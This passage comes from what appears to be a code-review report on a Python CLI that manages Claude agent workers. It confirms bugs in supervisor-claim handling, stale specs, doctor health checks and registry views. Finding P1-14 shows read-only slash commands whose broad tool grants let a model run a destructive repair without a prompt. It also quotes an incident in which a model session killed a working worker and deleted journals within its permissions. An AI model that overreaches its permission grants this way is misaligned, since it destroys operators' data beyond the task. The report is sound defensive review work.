`run([exe, "agents", "--json", "--all"], capture_output=True, ...)` — no `cwd`. It is called from ~20 sites including `cmd_status` at `bin/fleet.py:4087`, unconditionally whenever any non-archived worker exists ("ONE roster fetch per invocation"). `fleet status` is the single most-run verb.    - `bin/fleet.py:7903` `_doctor_check_claude_version` -> `run([exe, "--version"], ...)` — no `cwd`.    - Also `_rm_native_session_status` (:9290) and the stop path (:9297-ish) -> `run([exe, "rm"/"stop", r], ...)` — no `cwd`.  4. No upstream guard exists. There is no `os.chdir` anywhere in `bin/fleet.py` (grep: zero hits), no `FLEET_CLAUDE`/`CLAUDE_BIN` override (grep: zero hits), and `resolve_claude_executable` (bin/fleet.py:1340-1350) performs no validation of the returned string — it returns `which("claude")` verbatim. Both shims inherit the invoking shell's cwd: `bin/fleet.cmd` is `py -3.13 "%~dp0fleet.py" %*`, `bin/fleet` is `exec sh "$here/hooks/run_py.sh" "$here/fleet.py" "$@"`. `run_py.sh` will select `python3.10` when 3.13 is absent, and `$FLEET_PYTHON` can select it explicitly — so the vulnerable interpreter is a supported configuration, and CLAUDE.md states outright that the code must run on 3.10.  The only thing I could break is one detail of the stated scenario, which does not change the verdict (see correction).  Not refuted. The path is live, the input is unvalidated, and nothing upstream prevents it.

---

### P1-10 — `fleet clean` deletes the sup-release tombstone and re-arms the B6 wedge, deadlocking the supervisor tier

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `supervisor-claim`  |  **Category:** broken-invariant
- **Location:** `bin/fleet.py:6779`

**What is wrong**

`_releaser_body_is_tombstoned` disarms the wedge only while a record CARRYING the releaser's sid still exists:

```python
carriers = [rec for rec in workers.values() if released_by in _record_sids(rec)]
return bool(carriers) and not any(_record_is_live(rec) for rec in carriers)   # :11265
```

`cmd_sup_release` -> `_tombstone_releasing_body` writes `rec["status"] = "dead"` on the releasing body's own record, which is exactly what makes `carriers` non-empty and all-dead. But `cmd_clean` selects for deletion on status alone:

```python
_NATIVE_CLEAN_DELETABLE = {"dead"}                       # :6730
...
if verdict["status"] in _NATIVE_CLEAN_DELETABLE:         # :6779
    doomed_now.append((n, before[n]))
```

and then `data["workers"].pop(n, None)`. There is no claim-keyed gate here — no `_record_is_supervisor_claim_holder` check, no roster-liveness check for dead records, and no analogue of the `wedging-released-claim` gate 3b that `_archive_eligible` (:6942) got for precisely this class. Popping the record empties `carriers`, so `_releaser_body_is_tombstoned` flips back to False and `released_by in live_sids` re-arms `_releaser_live_sids` for every consumer.

**Failure scenario**

Measured end-to-end (scratch pytest, tmp FLEET_HOME, stubbed roster). State after a normal stand-down: INCARNATION = `{incarnation_id: inc-A, state: released, released_by_sid: S}`; registry holds `sup|inc-A|boot` with session_id=S and status "dead" (the tombstone `sup-release` just wrote); the released session S still lingers in `claude agents` (the exact window B6 exists for — `_roster_live_sids`' own docstring records bg sessions lingering >3h after their turn).
BEFORE: `_supervisor_gate("clean")` returns silently and `supervisor_claim_decision` returns `('claim', 'predecessor inc-A released cleanly -- fresh claim, no seizure')` — the successor can boot.
Run `fleet clean --yes` (permitted, because the tombstone disarmed the gate): it prints `removed sup|inc-A|boot (session S)` and the registry is `{}`.
AFTER: `supervisor_claim_decision` returns `('refuse', 'claim inc-A is released by sid S but that body is still live in the roster ... wait for that body to exit')` and `_supervisor_gate("clean")` raises `SupervisorClaimGateError`. Every mutating verb (spawn/send/kill/respawn/interrupt/archive/resume-limited/clean/init) now refuses for every sid-bearing caller, and `sup-boot` refuses for everyone — `cmd_sup_boot` has no no-sid bypass at all, so unlike the gate this one cannot be worked around from a plain shell. The only exits are S leaving the roster or a human hand-editing `supervisor/INCARNATION`, i.e. exactly the out-of-fleet middle step `_releaser_body_is_tombstoned`'s docstring says "is THE POINT OF THE WHOLE SLICE" to remove. No test covers this (`grep wedging tests/` hits only `_archive_eligible`).

**Fix**

Give `cmd_clean` the same protection `_archive_eligible` gate 3b has, keyed on the state that makes the tombstone load-bearing rather than on whether it is currently wedging: in the doomed-selection loop at :6779, skip any record for which `isinstance(claim, dict) and claim.get('state') == 'released' and claim.get('released_by_sid') in _record_sids(record)` while `claim.get('released_by_sid')` is still in `_roster_live_sids(roster_entries)` — i.e. never delete the release tombstone while the body it vouches for is still roster-live. (Reading the claim once per invocation, as `_archive_eligible` does.) Equivalently, `_releaser_body_is_tombstoned` could treat "no carrier at all, and the sid is roster-live" as tombstoned, but that weakens the wedge for the genuinely un-tombstoned case; the clean-side gate is the narrow fix.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* REACHABILITY LENS — I looked for an upstream guard, a validated/normalized input, or a dead branch. There is none, and I reproduced the whole sequence.  MECHANISM CONFIRMED IN CODE - `bin/fleet.py:11265-11267` `_releaser_body_is_tombstoned`: `carriers = [rec for rec in workers.values() if released_by in _record_sids(rec)]` / `return bool(carriers) and not any(_record_is_live(rec) ...)`. Deleting the only carrier makes `carriers` empty -> returns False. - `_releaser_live_sids` (`:11338-11342`) then falls through to `if released_by in live_sids: return {released_by}` -> wedge re-armed for BOTH consumers (B6 rule 1 at `:11477` and `_wedged_release_gate` at `:11905`). - `cmd_clean` (`:6732` `_NATIVE_CLEAN_DELETABLE = {"dead"}`, `:6781-6782`, pop at `:6828`) selects purely on the recomputed status. `"dead"` is in `_NATIVE_STICKY` (`:2757`) so `recompute_worker_native` passes it through unchanged; there is no claim read, no `_record_is_supervisor_claim_holder` call, and no roster-liveness gate anywhere in `cmd_clean`. I grepped every `_record_is_supervisor_claim_holder` / `_is_supervisor_shaped` call site — none is in `cmd_clean`.  REPRO (scratch FLEET_HOME, stubbed roster, `py -3.13`, no tracked file touched):   live_sids: {'SSSS-1111'}   BEFORE decision: ('claim', 'predecessor inc-A released cleanly -- fresh claim, no seizure')   removed sup|inc-A|boot (session SSSS-1111)   registry after: {"workers": {}}   AFTER decision: ('refuse', 'claim inc-A is released by sid SSSS-1111 but that body is still live in the roster ... wait for that body to exit') (The gate did not raise in my repro only because `_wedged_release_gate` calls `_fetch_agents_roster()` with the real `shutil.which` and no `claude` is on this box's PATH, so it fails open at `:11906`. On a real box it arms — the arm is unconditional per its own docstring.)  WHY THE WINDOW IS NOT NARROW (the strongest refutation I tried, and it fails). One might argue clean would never run between release and exit. But `_tombstone_releasing_body`'s docstring is explicit that `sup-release` runs no `claude stop` — "the body is told to exit itself" — and `_roster_live_sids` (`:11119-11131`) only excludes `state == "done"`. A bg supervisor that finishes its turn keeps `pid`/`status` with `state != "done"`, so it stays roster-live until someone stops it. `skills/fleet/SKILL.md:95` sells exactly this: "Nobody stops the retired body to make succession work". So the roster-live window is *by design* open-ended, not seconds, and `fleet clean` / `/fleet:clean` is a first-class documented verb (SKILL.md:49) that a sid-bearing caller CAN run in it (the tombstone disarms the gate — confirmed by `tests/test_sup_release_tombstone.py:292 test_the_gate_disarms_once_the_releaser_is_tombstoned`).  THE BEHAVIOUR IS ALREADY PINNED — AS INTENDED. `tests/test_sup_release_tombstone.py:592` `TestWhatElseTheTombstoneChanges` / `:606 test_the_retired_body_becomes_sweepable_by_clean` asserts exactly the finding's AFTER state (`clean --yes` == 0, record gone, "The session is STILL live in the roster -- this is the whole point"). Its stated rationale is "it is exactly the state a `fleet kill` leaves, and it is what the manual step produced anyway once the operator stopped the body" — and that rationale is false in the one dimension that matters: `cmd_kill` runs `claude stop` (the sibling test at `:630` proves it), so after a kill or after the manual step the sid is roster-GONE and B6 cannot arm. Here it lingers and B6 does arm. So this is a known-and-accepted deletion whose consequence was never examined — not an already-handled case.  NO IN-FLEET EXIT AFTER THE FACT, and clean makes it worse than the finding says: `test_it_does_not_cost_the_operator_the_stop_lever` (`:630`) relies on `fleet kill <body>` reaching the tombstoned record — but clean has deleted the record, so that lever is gone too. `cmd_doctor` has no released-wedge repair (grepped). Remaining exits are out-of-fleet `claude stop <sid>` or hand-editing `supervisor/INCARNATION`.  I therefore cannot refute. Two corrections to the write-up below.
- *(confidence: high)* I re-read the cited lines and reproduced the defect end-to-end in an isolated FLEET_HOME. bin/fleet.py:6732 (_NATIVE_CLEAN_DELETABLE = {"dead"}), :6781-6782 (selection on status alone) and :6829 (data["workers"].pop) are read correctly: cmd_clean has no claim-keyed gate, no holder check, and no roster-liveness check (grep for _record_is_supervisor_claim_holder hits :6906, :7677, :12112, :14456 -- none inside cmd_clean, whose body spans :6687-6844). "dead" is in _NATIVE_STICKY (:2757), so recompute_worker_native passes it through WITHOUT consulting the roster, which is why the still-roster-live releaser's tombstone is doomed. _releaser_body_is_tombstoned (:11267) requires bool(carriers), so popping the record flips it back to False. Measured: BEFORE clean, supervisor_claim_decision -> ('claim', 'predecessor inc-A released cleanly'), all gates pass; after `cmd_clean(yes=True)` the registry is {} and supervisor_claim_decision -> ('refuse', ...still live in the roster...) with clean/spawn/kill/send/archive/interrupt all raising SupervisorClaimGateError for a sid-bearing caller. sup-boot has no --force/--seize (:16200-16209). No existing test covers it: tests/test_gate_arm_wedge.py only exercises the un-tombstoned wedge; tests/test_supervisor.py:2531 is an unrelated source lint. I found no misread control flow, no platform/stdlib error, and no prior handling in docs (docs/NEXT-SESSION.md:74 notes only that the tombstone is clean-release-only). Two reachability facts narrow the severity rather than refute it: cmd_autoclean (:7766) calls cmd_archive + _sweep_husks + _expire_tombstones and never cmd_clean, so no scheduled beat triggers this; and _archive_eligible gate 3 (roster-live) already spares the record for the duration the wedge would matter, so clean is the only hole.

---

### P1-11 — terminal-surface.md D4 still asserts shipped code VIOLATES D4 in 6 places; it no longer does

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `tests-quality`  |  **Category:** docs-assert-what-code-does-not-do
- **Location:** `docs/specs/terminal-surface.md:68`

**What is wrong**

The spec of record for this surface still says, as a measured statement about shipped code:

    :68  **THE CURRENT STATE — the requirement is MET by the statusline and VIOLATED by every read-only `/fleet:*` command.** ... this paragraph is not to be deleted until they say something else.
    :64  *(A REQUIREMENT, not a description: VIOLATED by every read-only `/fleet:*` command at `02bf276`...)*
    :35  **This constraint is met by the statusline and NOT met by the read-only `/fleet:*` commands, which inline the bare CLI verbs**
    :115 The read-only `/fleet:*` commands ... inline `fleet status` / `fleet peek` / `fleet result` / `fleet doctor`, all of which take `fleet.lock` and quarantine a corrupt registry.
    :266 those commands inline the bare verbs, so a `/fleet:status` on a corrupt registry quarantines and exits 1 rather than reporting and exiting 0.
    :287 **Shipped code holds this for the statusline only.** ... so this invariant is presently violated through the slash-command surface

Measured against HEAD in an isolated FLEET_HOME with an invalid-JSON `state/fleet.json`:

    status RAISED RegistryCorruptError ... ; registry exists: True
    peek   RAISED RegistryCorruptError ... ; registry exists: True
    result RAISED RegistryCorruptError ... ; registry exists: True

None quarantine. `bin/fleet.py:9081` shows `cmd_doctor` takes `fleet_lock()` only inside `if repair:`; `cmd_peek`/`cmd_result` take it zero times. `commands/status.md` and `commands/overview.md` now inline `!\`fleet status --stale-ok\`` (pinned by `tests/test_view_quarantine.py::test_the_inline_status_call_is_the_stale_ok_read`), directly contradicting :266 and :115. CLAUDE.md:13 says the opposite of :68. The pin that was supposed to make this self-correcting only fires in one direction (finding 1), so nothing catches the prose going stale the other way.

**Failure scenario**

An agent or contributor reads `docs/specs/terminal-surface.md` D4 (the document CLAUDE.md names as the receipts home for this rule) to decide whether `/fleet:peek` is safe to run on a suspect registry. The spec tells them it takes `fleet.lock` and renames `state/fleet.json` aside; it does neither. Conversely, someone "fixing the violation" the spec describes re-routes an already-correct read path and reopens the incident, with the spec citing itself as justification. The receipts section is pinned `# at 02bf276` -- a pre-fix commit -- so `tools/verify_receipts.py` reproduces it happily and confirms nothing about HEAD.

**Fix**

Rewrite D4's CURRENT STATE paragraphs (lines 35, 64, 68, 115, 266, 287) to state that the requirement is now MET by all four read verbs as of the doctor-repair merge, keeping the `02bf276` receipts explicitly labelled as the historical measurement, and cite `tests/test_view_quarantine.py` + `tests/test_load_registry_callers.py` as the live pins instead of `tests/test_views_doctrine.py`. Add a test that fails when any D4 claim paragraph asserts a CURRENT STATE contradicting the live `_any_view_still_quarantines()` measurement in either direction.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Attempted refutation on all three available angles and all three failed.  (1) CODE: measured at HEAD (b7c5c85) in an isolated FLEET_HOME with an invalid-JSON state/fleet.json. `fleet status`, `fleet peek w`, `fleet result w`, `fleet doctor` all exit 1, leave the registry in place (survives), and print the `fleet doctor --repair` hint. None quarantines. bin/fleet.py:4064 (cmd_status) and bin/fleet.py:4343 (cmd_peek) call `read_registry_no_repair()` with no `fleet_lock()`, with in-code comments dated "D1/D4 (2026-07-27)" stating the lock and quarantine "are gone". So the spec's description of shipped behaviour is false.  (2) DOC STALENESS: `git log -- docs/specs/terminal-surface.md` ends at f94045f (the pre-fix views-doctrine slice). The fix merge 9739e74 ("views stop quarantining, and the CLAUDE.md rule becomes true") did not touch the spec; `git diff 9739e74..HEAD -- docs/specs/terminal-surface.md` is empty. All six cited lines are present verbatim at HEAD.  (3) "The claims are commit-qualified so they aren't false": only partly. Lines 64/68/287 do carry "at 02bf276". But :35 ("This constraint is met by the statusline and NOT met by the read-only /fleet:* commands"), :70-71, :115 ("they inline fleet status / fleet peek / fleet result / fleet doctor, all of which take fleet.lock and quarantine a corrupt registry") and :266 are unqualified present tense and false at HEAD. :71's specific claim that commands/{status,overview}.md inline the BARE verbs is contradicted by commands/status.md:6 and commands/overview.md:14, both `!`fleet status --stale-ok``.  (4) REACHABILITY (my assigned lens): CLAUDE.md:13 explicitly names docs/specs/terminal-surface.md D4 as the receipts home for this rule, so a reader checking the rule is routed straight into the stale prose. Not dead text.  (5) The claimed absence of a guard is real: `py -3.13 -m pytest -q tests/test_views_doctrine.py -rs` gives 11 passed, 2 skipped, skip reason "no view quarantines any more -- D4 is true of shipped code, so an unqualified restatement is no longer a defect." The pin only fires while a view still quarantines; nothing fails when the prose goes stale in the other direction.  The finding is a genuine docs-contradict-code defect, which the review scope explicitly admits ("docs that assert something the code does not do").
- *(confidence: high)* I tried to break this and could not. I materialised HEAD (b7c5c85) into a temp tree and re-ran the spec's own two receipt probes against it, plus the exit codes:  QUARANTINE (corrupt state/fleet.json, isolated FLEET_HOME):   fleet status            rc=1  survives   fleet status --stale-ok rc=0  survives   "fleet: registry unreadable"   fleet peek w            rc=1  survives   fleet result w          rc=1  survives   fleet doctor            rc=1  survives   "[FAIL] registry: ... Rerun as `fleet doctor --repair`"   fleet sup-status        rc=0  survives   fleet knowledge         rc=0  survives Nothing renames the file aside. The spec's pinned block at :310-317 shows RENAMED ASIDE for status/peek/result/doctor.  LOCK (valid registry, pre-created state/fleet.lock):   fleet status  TAKES fleet.lock ; status --stale-ok, peek, result, doctor, sup-status  ALL lock-free. The spec's pinned block at :327-333 shows TAKES fleet.lock for peek/result/doctor.  The code confirms the intent, not just the symptom. bin/fleet.py:4335-4343 (cmd_peek): "D1/D4 (2026-07-27): `peek` is a VIEW. ... It took `fleet.lock` ... and it quarantined a corrupt registry on the way ... Both are gone; `read_registry_no_repair` refuses loudly". bin/fleet.py:4392-4394 (cmd_result): same conversion. bin/fleet.py:9081-9088 (cmd_doctor): `with fleet_lock(): data = load_registry()  # the ONE quarantine site left` sits inside `if repair:`; the else branch is `read_registry_no_repair(hint=False)`.  Reviewer's control-flow reads are right, not misread. commands/status.md:6 and commands/overview.md:12 both inline `!`fleet status --stale-ok``, so the surface D4 governs is the lock-free, exit-0 snapshot path — directly contradicting :266's "a `/fleet:status` on a corrupt registry quarantines and exits 1 rather than reporting and exiting 0". No Windows/POSIX subtlety is involved; the quarantine is an os.replace in _quarantine_registry that is simply no longer reached.  The existing test does not cover this. tests/test_views_doctrine.py:245 `test_doctrine_is_not_restated_unqualified_while_it_is_false` calls `_any_view_still_quarantines()` and `pytest.skip(...)` when the answer is False — it fires only in the direction "code violates, docs assert compliance". A stale "code VIOLATES" claim is invisible to it, exactly as the finding says. `test_known_claim_sites_are_all_found` (floor of 5) even pressures the prose to keep those claim paragraphs alive.  The contradiction between governance docs is real: CLAUDE.md:13 says "CURRENT STATE: TRUE OF SHIPPED CODE, measured at the `wave2/doctor-repair` merge (2026-07-27)" and "the (now-discharged) REQUIREMENT/CURRENT-STATE split", while terminal-surface.md:68 says "THE CURRENT STATE — ... VIOLATED by every read-only `/fleet:*` command" and ":75 this paragraph is not to be deleted until they say something else". Both are dated 2026-07-27, so the date cannot disambiguate them, and the receipts are pinned `# at 02bf276` so verify_receipts.py reproduces the old commit happily.  Two things the finding overstates, which I record as a correction rather than a refutation.

---

### P1-12 — doctor PASSes and exits 0 on a quarantined (absent) registry, calling a nonexistent path "readable"

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `views-doctrine`  |  **Category:** silent-failure
- **Location:** `bin/fleet.py:9036`

**What is wrong**

`_doctor_check_registry` grades only on whether the loader raised:

```python
def _doctor_check_registry(error, repaired: bool):
    if error is None:
        return ("registry", True, f"{registry_path()} is readable")
```

`error is None` also covers the ABSENT case, because `read_registry_no_repair` returns `{"workers": {}}` for a missing file (bin/fleet.py:791-792). After `fleet doctor --repair` renames `state/fleet.json` to `state/fleet.json.corrupt.<ts>`, the next `fleet doctor` prints `[PASS] registry: ...\state\fleet.json is readable` for a file that does not exist.

Nothing else FAILs on the artifact either. `_doctor_check_autoclean` (bin/fleet.py:8492) is documented "PASS-note, never FAIL", so the only mention of the incident is a trailing clause inside a `[PASS]` row.

Measured on a fully-initialised sandbox home (`fleet init` run, real `bin/hooks/*`):

```
POST-REPAIR doctor exit code: 0
    [PASS] registry: ...\rh\state\fleet.json is readable
    [PASS] autoclean: no run recorded yet ...; quarantine artifact present (fleet.json.corrupt.2026-07-27T233938Z) -- husk sweep is refusing itself (NEW-1)
```

The module's own `_quarantine_artifacts` docstring (bin/fleet.py:679-693) names exactly this distinction as RULE 2 -- *"is this particular ABSENCE a fresh install, or an incident wearing a different name?"* -- and wires it into `_acting_worker_identity` and `_identity_abstention_note`, but not into the health row.

**Failure scenario**

Operator's `state/fleet.json` is truncated by a crash while six native workers are running. `/fleet:doctor` reports `[FAIL] registry:` and names the remedy; the operator runs `fleet doctor --repair` as instructed. From that moment `fleet doctor` exits 0 with every row green, `[PASS] registry: ...fleet.json is readable` naming a file that no longer exists. `/fleet:overview`'s prompt says "If `doctor` reported nothing and every worker is healthy, say so plainly and stop", so the model reports the fleet healthy. The six daemon sessions are now untracked orphans, and because `_sweep_husks` refuses while the artifact stands, autoclean will never reap them either -- the one row that knows is a PASS.

**Fix**

Grade the absent-registry case on `_quarantine_artifacts()`: when `error is None` and `registry_path()` does not exist, return `ok=False` with the artifact name and the restore instruction if `_quarantine_artifacts()` is non-empty, and a plain `not initialized -- run \`fleet init\`` note otherwise. `_quarantine_artifacts()` is already lock-free and never raises, so it is safe to call from a doctor check.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I could not refute the technical core; I reproduced it. Control flow, stdlib semantics and platform behavior were all read correctly.  VERIFIED BY EXECUTION (module loaded with FLEET_HOME pointed at a temp dir holding only `state/fleet.json.corrupt.2026-07-27T233938Z`, no `state/fleet.json`):   read_registry_no_repair(hint=False) -> {'workers': {}}   _doctor_check_registry(None, False) -> ('registry', True, '...\\state\\fleet.json is readable')   _quarantine_artifacts() -> ['fleet.json.corrupt.2026-07-27T233938Z']   _doctor_check_autoclean() -> ('autoclean', True, '... quarantine artifact present (...) -- husk sweep is refusing itself (NEW-1) ...')  Control flow confirmed: bin/fleet.py:792-794 `if not path.exists(): return {"workers": {}}` (the finding cited 791-792, off by one, immaterial), so `registry_error` stays None at 9080/9089, and 9038-9039 `if error is None: return ("registry", True, f"{registry_path()} is readable")` fires. `_doctor_check_autoclean` (actual def at 8494, finding said 8492) returns ok=True on every branch — 8590, 8594, 8599 — so the artifact clause can only ride a PASS. cmd_doctor returns `0 if all_ok else 1` (9144-9149). Nothing recreates the registry: `_quarantine_registry` (630-643) only renames and appends an event; `cmd_doctor` writes nothing after 9095; `cmd_status` only calls save_registry when a named worker's record actually changed, and with zero workers `names` is empty. `fleet init` never creates `state/fleet.json` (no save_registry/registry_path in cmd_init), so the absent state persists indefinitely.  Existing tests do not cover it. tests/test_view_quarantine.py::TestRepairIsTheOnlyQuarantine pins the --repair run itself (FAIL row, artifact created, event appended) but never re-runs doctor afterwards; no test anywhere asserts on the string "is readable". So there is no pin that either blesses or catches the post-repair PASS.  The invariant the reviewer invokes is the module's own, not an imported standard: `_doctor_check_registry`'s docstring (9030-9037) says it is registered first because "when this row fails, `workers` is empty and every worker-keyed check below it ... is reporting 'nothing to check' while looking exactly like 'nothing wrong'. The operator has to meet the reason before they meet the vacuous passes." Post-quarantine, `workers` IS empty and every worker-keyed check IS vacuous, and the row does not fail. `_quarantine_artifacts`'s RULE 2 (681-695) names exactly this absent-vs-incident distinction and is wired into `_acting_worker_identity` (2294) and `_identity_abstention_note` (12398) but not into the health row.  Where the finding OVERSTATES, and where its fix is wrong — see `correction`.
- *(confidence: high)* Reproduced end-to-end in a sandboxed FLEET_HOME. After `cmd_doctor(repair=True)` quarantines a truncated registry, `registry_path().exists()` is False and the very next `cmd_doctor(repair=False)` prints `[PASS] registry: ...\state\fleet.json is readable`. The path is not dead and not guarded upstream: bin/fleet.py:9089 uses `read_registry_no_repair(hint=False)`, which returns `{"workers": {}}` for a missing file (bin/fleet.py:793-794), so `registry_error` is None and `_doctor_check_registry` takes its unconditional PASS arm (bin/fleet.py:9038-9039). The absent state persists — hooks are read-only on the registry by invariant 6 (bin/hooks/stop_outcome.py:126), so nothing recreates fleet.json until the operator acts. No other check FAILs on the artifact: `_doctor_check_autoclean` returns ok=True on all three arms (bin/fleet.py:8590/8594/8599) and only appends the artifact clause as a trailing note (bin/fleet.py:8577-8581), and `cmd_doctor` grades all_ok solely on ok-flags (bin/fleet.py:9144-9149), so a fully-initialised home exits 0. No test pins the absent-registry PASS wording, so it is not a deliberately-sanctioned contract. Only mitigation found: the autoclean note does name the artifact and the remedy in plain language, and `/fleet:overview` inlines full doctor output, so the incident is not literally invisible — which softens the failure narrative but not the defect.

---

### P1-13 — Statusline and /fleet:status render a just-quarantined fleet as "not initialized"

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `views-doctrine`  |  **Category:** correctness
- **Location:** `bin/fleet.py:2988`

**What is wrong**

`_read_registry_readonly` -- the single derivation every view consumes -- classifies a missing registry as a fresh install with no further test:

```python
    path = registry_path()
    if not path.exists():
        return (False, "not_initialized", {"workers": {}})
```

`bin/fleet_statusline.py:172-175` turns that into `[fleet]: not initialized`, and `_print_snapshot_table` (bin/fleet.py:4168) into `fleet: not initialized`. Because `_quarantine_registry` RENAMES rather than deletes, "absent" is precisely what a quarantined incident looks like, and the views have no way to tell it from a machine that has never run `fleet init`.

Measured on the same post-`--repair` home:

```
artifacts: ['fleet.json.corrupt.2026-07-27T233938Z']
registry exists: False
=== statusline ===
[fleet]: not initialized
=== fleet status --stale-ok ===
fleet: not initialized
```

The views doctrine explicitly permits a view to *report* corruption (`[fleet]: registry unreadable`), so reporting a carried incident is in-scope for this surface; it simply is not implemented for the post-rename state.

**Failure scenario**

Same sequence as above. After the sanctioned repair, the two surfaces the operator reads continuously -- the statusline under the input box and `/fleet:status` -- both print the exact string a machine with no fleet at all prints. An operator who steps away and comes back, or a fresh interface session running the skill's startup ritual, is told there is no fleet, while `state/fleet.json.corrupt.<ts>` holds the roster of six live sessions and the husk sweep is deadlocked on it.

**Fix**

In `_read_registry_readonly`, when `path` does not exist, consult `_quarantine_artifacts()` and return a distinct reason (e.g. `"quarantined"`) when one stands; render it as `[fleet]: registry quarantined` / `fleet: registry quarantined -- state/fleet.json.corrupt.<ts>`. Both `Path.exists()` and the glob are read-only and never raise, so D1/D4 are preserved.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Reproduced end-to-end in a scratch FLEET_HOME: a truncated state/fleet.json + `fleet doctor --repair` leaves only state/fleet.json.corrupt.<ts>, after which `fleet status --stale-ok` prints `fleet: not initialized` and bin/fleet_statusline.py prints `[fleet]: not initialized`. Every link is reachable and unguarded: load_registry (bin/fleet.py:751-759) RENAMES, nothing recreates the registry afterward (cmd_status only writes when `changed`), _read_registry_readonly (bin/fleet.py:2989-2991) classifies absence as not_initialized with no artifact test, and both render sites (bin/fleet.py:4169-4171, bin/fleet_statusline.py:172-175) turn that into the fresh-install string. The route in is the sanctioned one the refusal text names (REGISTRY_REPAIR_HINT, bin/fleet.py:710). So the branch is live, not dead, and no upstream guard prevents the input. Two caveats narrow it: (a) the destructive consequence is already closed — _sweep_husks (bin/fleet.py:7649-7655) refuses presence-only on the artifact, _doctor_check_autoclean (bin/fleet.py:8577-8581) and `fleet autoclean` both name the artifact, _identity_abstention_note (bin/fleet.py:12398-12403) explains it, and the roster survives inside the artifact, so the harm is informational; (b) the finding's startup-ritual clause is factually wrong — skills/fleet/SKILL.md:25 runs bare `fleet status` (empty table, not `not initialized`) and `fleet autoclean`, which errors with `husk sweep refused: quarantine artifact present (fleet.json.corrupt....)`. Also note the current rendering matches the written spec row docs/specs/terminal-surface.md:260, so a fix must edit that row as well.
- *(confidence: high)* I reproduced the claim end-to-end in an isolated temp FLEET_HOME and it holds. After cmd_doctor(repair=True) on a corrupt registry, status_snapshot() returns ok=False reason='not_initialized', render_statusline prints '[fleet]: not initialized', and `fleet status --stale-ok` prints 'fleet: not initialized' -- byte-identical to a machine that never ran `fleet init`, while state/fleet.json.corrupt.<ts> stands. The reviewer read the control flow correctly: bin/fleet.py:2989-2991 tests only path.exists(); bin/fleet_statusline.py:172-175 and bin/fleet.py:4169-4172 branch on reason=='not_initialized'. No stdlib/Windows misread (rename genuinely removes the source name). I searched tests/test_view_quarantine.py, tests/test_views_doctrine.py, tests/test_terminal_surface.py and tests/test_identity_quarantine_glob.py: none pins the post-quarantine render of either surface, so it is not already covered. The repo's own taxonomy in _quarantine_artifacts (bin/fleet.py:681-695) states RULE 2 as 'how an absent registry gets read and described' but enumerates only the two identity readers (_acting_worker_identity :2293, _identity_abstention_note :12398); the views describe an absent registry and are absent from that list, so this is a genuine gap rather than a documented exemption. However I did refute parts of the failure scenario: skills/fleet/SKILL.md step 2 of the startup ritual runs `fleet autoclean`, which I measured printing 'autoclean: husk tier failed: husk sweep refused: quarantine artifact present (fleet.json.corrupt.2026-07-27T235844Z) ... (NEW-1)' with rc 1, so a fresh interface session is NOT told there is no fleet; /fleet:overview inline-execs `fleet doctor`, whose autoclean row also names the artifact (bin/fleet.py:8577-8581); the husk sweep is not silently deadlocked but refuses loudly (bin/fleet.py:7649-7655); and the artifact cannot be asserted to 'hold the roster of six live sessions' since it is by construction a file that failed parse/shape validation. Also unflagged by the proposed fix: `reason` has four consumers, including bin/fleet.py:12821 (`if reason != "not_initialized"` in sup-release) -- a new third value silently reclassifies that branch and the :4170 / statusline:173 else-branches unless all are edited together.

---

### P1-14 — Read-only /fleet:doctor and /fleet:overview pre-approve `fleet doctor --repair`, the sole quarantine write

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `views-doctrine`  |  **Category:** permissions
- **Location:** `commands/doctor.md:3`

**What is wrong**

```
allowed-tools: 'Bash(fleet doctor:*)'
```
(and `commands/overview.md:3`: `Bash(fleet status:*), Bash(fleet doctor:*), Bash(fleet knowledge:*), Bash(fleet sup-status:*)`)

A `Bash(fleet doctor:*)` grant matches `fleet doctor --repair`, which is the ONE verb that performs the irreversible quarantine rename under `fleet_lock()` (bin/fleet.py:9080-9082). The bodies of both files tell the model not to run it ("let the operator run it"; "do not run it yourself"), but the grant means it needs no permission prompt if it does.

Both repo lints miss it. `tests/test_terminal_surface.py:768` enumerates `DESTRUCTIVE_VERBS = ("kill", "clean", "respawn", "interrupt", "spawn", "send", "attach", "release", "resume-limited")` -- no `doctor`. `tests/test_view_quarantine.py:674` scopes its `--repair` ban to the inline-exec spans only, and says so deliberately -- so the tool-call route is unguarded.

This is the same shape as the incident the lint was written for, quoted at tests/test_terminal_surface.py:763: *"A read-only command once carried `Bash(fleet:*)` ... A haiku session invoked /fleet:status, decided the dead workers were untidy, and -- fully within permissions -- killed a working worker and cleaned five journals. 2026-07-09, real data loss."*

**Failure scenario**

Operator types `/fleet:doctor` on a machine whose `state/fleet.json` is corrupt. The inline `!`fleet doctor`` output contains `[FAIL] registry: ... repair it with \`fleet doctor --repair\``. The model, holding a matching grant and reading a prompt that names the fix, runs `Bash(fleet doctor --repair)`. No permission prompt fires. The operator's registry -- containing the only record of every live worker's name, cwd, sid and journal -- is renamed aside from a command whose description is "Fleet health check", and (per findings 1 and 2) every surface then reports the fleet as fresh and healthy.

**Fix**

Narrow the grants so `--repair` cannot match, e.g. `Bash(fleet doctor)` in `commands/doctor.md` and `commands/overview.md`, and add `"doctor --repair"` to `DESTRUCTIVE_VERBS` in `tests/test_terminal_surface.py` (or add a dedicated assertion that no read-only command's `allowed-tools` grant matches `fleet doctor --repair`).

**Verification** — 2 independent skeptics, neither could refute:

